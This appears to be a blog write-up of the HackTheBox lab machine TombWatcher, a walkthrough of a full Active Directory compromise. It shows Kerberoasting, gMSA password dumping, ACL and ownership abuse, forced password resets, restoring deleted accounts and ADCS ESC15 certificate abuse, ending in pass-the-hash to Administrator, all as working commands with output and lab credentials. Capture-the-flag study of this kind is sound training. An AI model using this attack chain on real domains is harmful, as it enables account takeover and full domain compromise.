---
title: TombWatcher - HTB
date: 2025-06-09
categories: [WriteUps, HTB]
tags: [HTB, windows, AD, privesc]
image:
  base: /assets/img/posts/htb/tombwatcher
active: false
difficulty: medium
os: windows
description: "TombWatcher is the 4th machine of HackTheBox Season 8."
pawned: root
---


# Scan
```bash
sudo nmap -sS -Pn -n -p- -sC -sV 10.10.11.72 -oN nmap.dump
```

# Foothold
We have some credentials as starter: `henry:H3nry_987TGV!`:

```bash
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -dc DC01.tombwatcher.htb -c All -o bloodhound_results.json -ns 10.10.11.72
```

# User
Open bloodhound and we find some creds!

Password: `admin:CQVTGJ_3KMMr4yvNAx40hgafoH_OlMnC` -> `Admin123456`!

On bloodhound we see a WriteSPN on user alfred!
-> targetedKerberoast.py!

```bash
netexec smb 10.10.11.72 -p 'H3nry_987TGV!' -u 'henry' --shares
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share


faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" python3 targetedKerberoast.py -f hashcat -vv -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -U user.txt
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$911a6339994ae6a724f961f34cd50f0e$240441d21a089c8a416a3f5a839837a667d6f7be1ab15e409848b4ff0908b7d3c7dc5b9f15b6bf1f2faa20f4f57b803dbef07d43f705de19a3e91f0802315d89f6b5688e85c5f52e237cadbc685f95459ff76026d89aa42ee6b6f3ad4d2f5513152ba4a68b29e6df5ada1f0b94c4293b86a83fc48f29c7ed1288d877f081dad71b054ab37ca71bd19ed4efd975a75f74404bbc2c0ecefa32899dcbce23ab25b9db72654018503c0fc2d286e4abd08a488c88f02d79b3e29c9011ac30fc750aa822a23c654f6dd682156bff3726f899fd4fce5aad970ccc036d30eeeb6858e081422693df144b54ab7cf64a5deb0be0871cdebda88be4bd48d08122578903e6a50d9c1351184ffb0f1b503b11e37b121d1022ceaca53a76d05d2258c630a3a0ed4269ca95f33838c4d6b98f66f20edc2a3b36c180747196dc625ddb6c4743d8c1053dbb5b898466573b2e72819860f0b42757f6dfe8da99d17f7da09de71a5151c9d0cd5fb5cc73952bef367b653328161e923545f790923238a72333dd1c6534470d40e57bdefbd52f7e2f488788bd08bbf65007578e819df05d177b3f868440062ff038be8ff2fce01c15a53236a94eecce98bf244e92a15e98d9093f4ce0092f36d5170e1b6b982f482e709438030733663c579dafd2b7af8ef5f736f81beb1c1098e26ca9ac7e7e5ab09f891aa7da1d2b033303b5ed3fa413b1d5c2a0a53980b39068642c5b9d2bee499ddd755feb68079de4a9cbe0d4a8721cfcb6da7a9dc93edfdd58b13c4e7d38867e089f5dac1f4f06e8f158c4ea6868dee54025c7f38411323f19e7f28d84fdd0fbba4ce69fe6906e3977fb7acf87c6c8413e66d6b18c8d8e9e24a9ba163a52e9c29ce3e14f7f93b627442af1d7f347894cf757ad7e9451366d6d166c2ba0ea4559f4fce56d8e0920fea3365207df051cbbade29df9c253fe7f3694a101923f89558522943395694924c4606bf4b4cf68f3d8bcb6237a8264372a7227adf0ce342a49f9471e063d898ff1fb986c83534f34030c65aaf889562ba4f56d52eed8c82f500d7df9fe4135033a43a7069ef1673071be663bf0d63d7d45595d3dd3c3b133c786b02d13c33f6d1a1d4f60c39e04a322342c894abc0f681560424089121bc1a7d33ce4c4c63294f562f7a05c951e5b1f1ff83d9c184e9b20e45b8f5d8ab1f6aa1ed33825cb5b5a1801e88fab854af904dea6e2b7c44bb124fa6cc443a78190a16c67d2f8d2a02b5962afeddb1a928244db732ac91d3fff3b17ed6e0dea6d6c0e1f9cfb28a02d008c4d33e1ade0dff4c02af609436d32f53d8cd3763129918df83388ccbd3e31f99a21963ba86a9baa574aaeccfc273dd1448a6c6b5a352b1b83eceda0c9ff497f7eb1abb7c56789c601593c5ecc65ae0fdaaeb0d050f1f8c7e007c6a14fac8334a543b1fe3db17aca8fb507d4ba91a187ccb31315840557cff9f1b85362b0ccb38d


hashcat -h | grep "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol  <--- THIS ONE with type 23
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$5fd08d308a7f95b97ace5961380a32c1$13b3926c284802c1abb23bebcf28b0ff6d2fcef19bb942fc541be73a46a98c23d1a8a868853a60f82d2eb788b357e1ac746055bd866383811a9d6cb8ee473403aafcbb1928cd32b81bee836ccf98eff1756409f97bf4c2742e969ed0038d7a69ab5f8a8c357a7e948ecd2b2c6e0bc7fb47f33198d112fbb0f046d38f1c868efe8c41050a14da69937f7c0e4b0b212361738456413666f1773c4dbcbaf8eeae46289514f0d035d551bce0f92608d78a561d31c3dbe9a20fa3ac219882a11e65b7fe3f19a2e4b787a34ed60a7bc3dc7523980191597276de0fb91cff0968862a38f397d289fc0f70d11ec759915fd2d083a22ae8d6f5dda63c2ff6164f5c60b5e62bd11e63c5a702da05214833a7a129871304c335332bf8594b5e2368f1f06595df456ad75597fc080417a4724752e1bb2df5a9ed70960832a84d7d20134383c4f4d25b1f76905ebedf6053536c42d186ac1d0539a38f12f3193685b543ee7829c191af4544e427425765023e83f9e47665e748d4a4f7f4daa2424b3f9bc8f6e2a1dea608b582a8809dab28f6d0f16872c4d77c18f046dd37fd26e431f1803d0fd89812ce31e68a695adb0d4380d86ae7fccf77f203af6331e55d19e09ff1ff6fbaa1cb5b1304834d1beca167bec4fac584cf013172e626cd8b291c88089c3a684ad6e3f1d28ec6a1ea9df034d69fa74ea93d7a32755447b59fb55c8a68882647e114df47e9a9f1aae395e740a886f50b4e985e725832cf62399019a09630580bfba56ef2fd92c597494d746bb41a969da36b255400b48ebc5873a35fa343b549ea75c77eca1ebc680551402281adcefa05cb4389e9f081be9f48d580513650d6908555c885c637de2eb5b5952449ad9dc89e7a4a83a37f50bdfd695827fc774abd9c9a12a6fbbe07da8546c7b9e94c7bd787b5e788751368b2f5026c6ec887ecf49b8891d81a2b91622dbbeacd8d2397e75ad4ed8bb87522b2fdea2108a50effeec67f08e4e35c51a6fac787f6f654dbe89827c42f3b74e6c68f22689c268cf769af0f2a90f249d1f1c79c9d8f3b092dddb3405624039d13ba78b639e783a4370b506b0dc1401cd7ec90e7345980a19db44603ec7014c3a8be55cdc2027b7602bef1a8900d80f8e852a46e9e74994787c217d87161fe4023a8810651c6fe01b3d628125743d0179985ec5c3d11b9ea208ad224e01d48373c73dc876f559561e0c74ed0dd09a00a0bb3ba9b6890f0a12628a6848ae75b666630dc679a8364bbc34b392ba5925bab6c7788b75c41a1f399bdd310f96bf075f1f18eebc725bc8aa699fdf9936f00930d8f39647b20699e31948efe37580a6362a470cc4bf52d5131e61046bddfb5b48889056ef7301701be14edf768995e75dd54e2c36c390fa5865461ad585f8f6c27d0a6cda0af2e6ef9ac721ba0a3c918aa56ba02e3c1c98b0901085ddba83fea0352926d783fac3fdbcfdb1a4ac6:
basketball
```


alfred -> no group but AddSelf on INFRASTRUCTURE 


- THIS ADD DOES NOT WORK! ????
```bash
net rpc group addmem "INFRASTRUCTURE" "alfred" -U "TOMBWATCHER.HTB"/"alfred"%"basketball" -S DC01.TOMBWATCHER.HTB
Could not add alfred to INFRASTRUCTURE: NT_STATUS_ACCESS_DENIED
```

- THIS ADD DOES WORK
```bash
python3 bloodyAD.py -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred
[+] alfred added to INFRASTRUCTURE
```

CHECKing: 
```bash
net rpc group members "Infrastructure" -U 'TOMBWATCHER.HTB/alfred%basketball' -S 10.10.11.72
TOMBWATCHER\Alfred
```

WTF??? Why net rpc add didnt work?

INFRASTRUCTURE ---- ReadGMSAPassword ----> ANSIBLE_DEV

```bash
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a

python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher.htb -u 'ansible_dev$' -p :1c37d00093dc2a5f25176bf2d474afdc set password 'SAM' 'Password123456!'
[+] Password changed successfully!

SAM:Password123456!

owneredit.py -action write -new-owner 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!' -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
```

THIS FAILS BECAUSE OF LDAP: https://github.com/cannatag/ldap3/issues/1051

```bash
pip3 install -r requirements.txt
pip3 install pyOpenSSL==24.0.0
pip3 install cryptography==44.0.2
git clone https://github.com/cannatag/ldap3.git
pip3 install ldap3/
```

One way around:
```bash
pip3 freeze
asn1crypto==1.5.1
asyauth-bAD==0.0.26
asysocks==0.2.13
blinker==1.9.0
bloodyAD @ file:///home/user/Documents/HACKS/HTB/Season8/W4-TombWatcher/tools/bloodyAD
cffi==1.17.1
charset-normalizer==3.4.2
click==8.2.1
cryptography==44.0.2
dnspython==2.7.0
Flask==3.1.1
h11==0.16.0
impacket==0.12.0
itsdangerous==2.2.0
Jinja2==3.1.6
ldap3 @ file:///home/user/Documents/HACKS/HTB/Season8/W4-TombWatcher/tools/bloodyAD/ldap3
ldapdomaindump==0.10.0
MarkupSafe==3.0.2
minikerberos-bAD==0.4.10
msldap-bAD==0.5.22
prompt_toolkit==3.0.51
pyasn1==0.6.1
pyasn1_modules==0.4.2
pycparser==2.22
pycryptodomex==3.23.0
pyOpenSSL==24.0.0
six==1.17.0
tabulate==0.9.0
tqdm==4.67.1
typing_extensions==4.14.0
unicrypto==0.0.10
wcwidth==0.2.13
Werkzeug==3.1.3
winacl==0.1.9
```

```bash
python3 .env/bin/owneredit.py -action write -new-owner 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!' -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[+] Impacket Library Installation Path: /home/user/Documents/HACKS/HTB/Season8/W4-TombWatcher/tools/bloodyAD/.env/lib/python3.11/site-packages/impacket
[+] Initializing domainDumper()
[+] Target principal found in LDAP (JOHN)
[+] Found new owner SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[+] Attempt to modify the OwnerSid
[*] OwnerSid modified successfully!



python3 .env/bin/owneredit.py -action read -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!' -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/user/Documents/HACKS/HTB/Season8/W4-TombWatcher/tools/bloodyAD/.env/lib/python3.11/site-packages/impacket
[+] Initializing domainDumper()
[+] Target principal found in LDAP (JOHN)
[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb



python3 .env/bin/owneredit.py -action write -new-owner 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!' -debug
python3 .env/bin/owneredit.py -action read -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!' -debug
python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123456!' set password 'JOHN' 'Password123456!'  # DOES NOT WORK
python3 .env/bin/dacledit.py -action 'write' -rights 'FullControl' -principal 'SAM' -target 'JOHN' 'TOMBWATCHER.HTB'/'SAM':'Password123456!'  # With this FullControl set we can now write the password
```


Now we can set the password
```bash
net rpc password john "Password123456!" -U "TOMBWATCHER.HTB"/"SAM"%"Password123456!" -S 10.10.11.72
# OR
python3 bloodyAD.py --host 10.10.11.72 -d tombwatcher.htb -u 'SAM' -p 'Password123456!' set password 'JOHN' 'Password123456!'
```

```bash
evil-winrm -i 10.10.11.72 -u JOHN -p 'Password123456!'
*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
7826f6a6230b9e9af5c0c09af1c71d49
```

# Root
```bash
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf



Get-ADObject -Identity "f80369c8-96a2-4a7f-a56c-9c15edd7d1e3" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3


Restore-ADObject -Identity "f80369c8-96a2-4a7f-a56c-9c15edd7d1e3"
```


Using John:
```bash
net rpc password cert_admin "Password123456!" -U "TOMBWATCHER.HTB"/"JOHN"%"Password123456!" -S 10.10.11.72


faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" certipy account -u 'john' -p 'Password123456!' -dc-ip 10.10.11.72 -user 'cert_admin' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'cert_admin':
    cn                                  : cert_admin
    distinguishedName                   : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
    name                                : cert_admin
    objectSid                           : S-1-5-21-1392491010-1358638721-2126982587-1109
    sAMAccountName                      : cert_admin
    userAccountControl                  : 66048
    whenCreated                         : 2024-11-16T00:55:59+00:00
    whenChanged                         : 2025-06-09T18:14:03+00:00



faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" certipy find -vulnerable -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250609143607_Certipy.txt'
[*] Wrote text output to '20250609143607_Certipy.txt'
[*] Saving JSON output to '20250609143607_Certipy.json'
[*] Wrote JSON output to '20250609143607_Certipy.json'
```


Restoring first cert_admin didnt work:

Restoring last one:

```bash
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
net rpc password cert_admin "Password123456!" -U "TOMBWATCHER.HTB"/"JOHN"%"Password123456!" -S 10.10.11.72
certipy find -vulnerable -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72
cat 20250609110905_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

VULN!!!!

# First strategy does not work ESC15
```bash
faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72  -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'


# SECOND strategy works ESC15
certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72 -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'


certipy req -u 'cert_admin' -p 'Password123456!' -dc-ip 10.10.11.72 -target 'DC01.TOMBWATCHER.HTB' -ca 'tombwatcher-CA-1' -template 'User' -pfx cert_admin.pfx -on-behalf-of 'TOMBWATCHER\Administrator'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'


faketime "$(ntpdate -q dc01.tombwatcher.htb | cut -d ' ' -f 1,2)" certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc



evil-winrm -i 10.10.11.72 -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc'
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
05a2f195657648e3d983c575b9d1c2d7
```